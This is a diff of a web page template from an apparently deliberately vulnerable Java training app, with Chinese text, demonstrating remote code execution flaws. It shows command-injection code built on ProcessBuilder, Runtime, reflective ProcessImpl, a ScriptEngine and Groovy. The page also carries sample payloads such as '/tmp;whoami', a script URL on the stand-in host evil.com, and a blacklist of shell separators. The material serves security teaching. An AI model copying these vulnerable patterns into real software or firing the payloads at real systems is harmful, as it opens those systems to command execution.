@@ -14,12 +14,12 @@
         <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">
             <div class="vul_header">
                 <span>远程代码执行</span>
-                <a class="btn btn-sm btn-primary" target="_blank" href="">漏洞案例</a>
             </div>
             <hr>
             <ul class="nav nav-tabs">
                 <li class="nav-item">
-                    <a class="nav-link active" data-toggle="tab" href="#aa"><span class="lnr lnr-bug"></span> 漏洞描述</a>
+                    <a class="nav-link active" data-toggle="tab" href="#aa"><span class="lnr lnr-bug"></span>
+                        漏洞描述</a>
                 </li>
                 <li class="nav-item">
                     <a class="nav-link" data-toggle="tab" href="#bb"><span class="lnr lnr-bullhorn"></span> 安全编码</a>
@@ -28,12 +28,13 @@
 
             <div class="tab-content">
                 <div class="tab-pane dec shadow-sm p-3 mb-4 rounded active" id="aa">
-                    RCE (Remote Code Execution), 远程代码执行漏洞，这里包含两种类型漏洞:<br><br>
+                    RCE (Remote Code Execution), 远程代码执行漏洞，这里包含两类漏洞:<br><br>
                     命令注入（Command Injection），在某种开发需求中，需要引入对系统本地命令的支持来完成特定功能，当未对输入做过滤时，则会产生命令注入<br>
                     代码注入（Code Injection），在正常的java程序中注入一段java代码并执行，即用户输入的数据当作java代码进行执行。
                 </div>
                 <div class="tab-pane fade" id="bb">
-                    <textarea disabled="disabled" class="form-control shadow-sm p-3 mb-5 rounded" id="coder" style="height: 230px;">
+                    <textarea disabled="disabled" class="form-control shadow-sm p-3 mb-5 rounded" id="coder"
+                              style="height: 230px;">
 【建议】避免不可信数据拼接操作系统命令
  当不可信数据存在时，应尽量避免外部数据拼接到操作系统命令使用 Runtime 和 ProcessBuilder 来执行。优先使用其他同类操作进行代替，比如通过文件系统API进行文件操作而非直接调用操作系统命令。
 
@@ -49,31 +50,49 @@
 
             <div class="box-float">
                 <div class="float1">
-                    <a style="float:right" class="btn btn-sm btn-danger"
-                       th:href="@{/RCE/ProcessBuilder/vul?filepath=/tmp;whoami}">运行</a>
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                       th:href="@{/RCE/ProcessBuilder/vul?filepath=/tmp;whoami}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - ProcessBuilder方式</span></h5>
 
-                    <textarea class="form-control" id="code1">
+                    <label for="code1"></label><textarea class="form-control" id="code1">
+// new ProcessBuilder(command).start()
 // 功能是利用ProcessBuilder执行ls命令查看文件，但攻击者通过拼接; & |等连接符来执行自己的命令。
 
-@RequestMapping("/ProcessBuilder")
-public static String cmd(String filepath) {
+public static String processbuilderVul(String filepath) throws IOException {
     String[] cmdList = {"sh", "-c", "ls -l " + filepath};
-    StringBuilder sb = new StringBuilder();
-
     ProcessBuilder pb = new ProcessBuilder(cmdList);
     pb.redirectErrorStream(true);
-    ...
+    Process process = pb.start();
+
+    // 获取命令的输出
+    InputStream inputStream = process.getInputStream();
+    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+    String line;
+    StringBuilder output = new StringBuilder();
+    while ((line = reader.readLine()) != null) {
+        output.append(line).append("\n");
+    }
+    return output.toString();
+}
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger"
-                       th:href="@{/RCE/Runtime/vul?cmd=id}">运行</a>
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                       th:href="@{/RCE/Runtime/vul?cmd=id}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - Runtime方式</span></h5>
-                    <textarea class="form-control" id="code2">
-// getRuntime()常用于执行本地命令，使用频率较高。
+                    <label for="code2"></label><textarea class="form-control" id="code2">
+// Runtime.getRuntime().exec(cmd)
 
-@RequestMapping("/runtime")
-public static String cmd2(String cmd) {
+public static String vul(String cmd) {
     StringBuilder sb = new StringBuilder();
     try {
         Process proc = Runtime.getRuntime().exec(cmd);
@@ -83,10 +102,43 @@ public static String cmd2(String cmd) {
      ...
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger"
-                       th:href="@{/RCE/ScriptEngine/vul?url=http://evil.com/java/1.js}">运行</a>
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                       href="/RCE/ProcessImpl/vul?cmd=id">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
+                    <h5><span class="lnr lnr-bug"> 漏洞代码 - ProcessImpl</span></h5>
+                    <label for="code5"></label><textarea class="form-control" id="code5">
+// ProcessImpl 是更为底层的实现，Runtime和ProcessBuilder执行命令实际上也是调用了ProcessImpl这个类
+// ProcessImpl 类是一个抽象类不能直接调用，但可以通过反射来间接调用ProcessImpl来达到执行命令的目的
+
+public static String vul(String cmd) throws Exception {
+    // 首先，使用 Class.forName 方法来获取 ProcessImpl 类的类对象
+    Class clazz = Class.forName("java.lang.ProcessImpl");
+
+    // 然后，使用 clazz.getDeclaredMethod 方法来获取 ProcessImpl 类的 start 方法
+    Method method = clazz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
+
+    // 使用 method.setAccessible 方法将 start 方法设为可访问
+    method.setAccessible(true);
+
+    // 最后，使用 method.invoke 方法来调用 start 方法，并传入参数 cmd，执行命令
+    Process process = (Process) method.invoke(null, new String[]{cmd}, null, null, null, false);
+}
+                    </textarea><br><br>
+
+                    <hr>
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                       th:href="@{/RCE/ScriptEngine/vul?url=http://evil.com/java/1.js}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - 脚本引擎代码注入</span></h5>
-                    <textarea class="form-control" id="code3">
+                    <label for="code3"></label><textarea class="form-control" id="code3">
 // 通过加载远程js文件来执行代码，如果加载了恶意js则会造成任意命令执行
 // 远程恶意js: var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
 // ⚠️ 在Java 8之后移除了ScriptEngineManager的eval
@@ -99,10 +151,15 @@ public void jsEngine(String url) throws Exception {
 }
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger"
-                       href="/RCE/Groovy/vul?cmd='open -a Calculator'.execute()">运行</a>
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                       href="/RCE/Groovy/vul?cmd='open -a Calculator'.execute()">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - Groovy执行命令</span></h5>
-                    <textarea class="form-control" id="code4">
+                    <label for="code4"></label><textarea class="form-control" id="code4">
 // 不安全的使用Groovy调用命令
 
 import groovy.lang.GroovyShell;
@@ -113,35 +170,54 @@ public void groovy(String cmd) {
 }
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger" href="/RCE/ProcessImpl/vul?cmd=id">运行</a>
-                    <h5><span class="lnr lnr-bug"> 漏洞代码 - ProcessImpl</span></h5>
-                    <textarea class="form-control" id="code5">
-// ProcessImpl是更为底层的实现，Runtime和ProcessBuilder执行命令实际上也是调用了ProcessImpl这个类
-
-Class clazz = Class.forName("java.lang.ProcessImpl");
-Method method = clazz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
-method.setAccessible(true);
-method.invoke(null, new String[]{cmd}, null, null, null, false);
-                    </textarea><br><br>
-
                 </div>
 
                 <div class="float2">
-                    <a style="float:right" class="btn btn-sm btn-success"
-                       th:href="@{/RCE/ProcessBuilder/safe?filepath=/tmp;whoami}">运行</a>
-                    <h5><span class="lnr lnr-smile"> 安全代码 - 过滤特殊字符</span></h5>
-                    <textarea class="form-control" id="code6">
+                    <a style="float:right" class="btn btn-sm btn-success" target="_blank"
+                       th:href="@{/RCE/ProcessBuilder/safe?filepath=/tmp;whoami}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
+                    <h5><span class="lnr lnr-smile"> 安全代码 - 过滤方式</span></h5>
+                    <label for="code6"></label><textarea class="form-control" id="code6">
 // 自定义黑名单，这里过滤了常见的管道符，可自行添加
 
 public static boolean checkOs(String content) {
-    String black = "|,&,&&,;,||";
-    String[] black_list = black.split(",");
+    String[] black_list = {"|", ",", "&", "&&", ";", "||"};
     for (String s : black_list) {
         if (content.contains(s)) {
             return true;
         }
     }
     return false;
+}
+                    </textarea><br><br>
+
+                    <a style="float:right" class="btn btn-sm btn-success" target="_blank"
+                       th:href="@{/RCE/Runtime/safe?cmd=whoami}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
+                    <h5><span class="lnr lnr-smile"> 安全代码 - 白名单方式</span></h5>
+                    <label for="code7"></label><textarea class="form-control" id="code7">
+// 使用白名单替换黑名单。黑名单需要不断更新，而白名单只需要指定允许执行的命令，更容易维护。
+
+public static String safe(String cmd) {
+    // 定义命令白名单
+    Set<String> commands = new HashSet<\>();
+    commands.add("ls");
+    commands.add("pwd");
+
+    // 检查用户提供的命令是否在白名单中
+    String command = cmd.split("\\s+")[0];
+    if (!commands.contains(command)) {
+        return "命令不在白名单中";
+    }
+    ...
 }
                     </textarea>
 
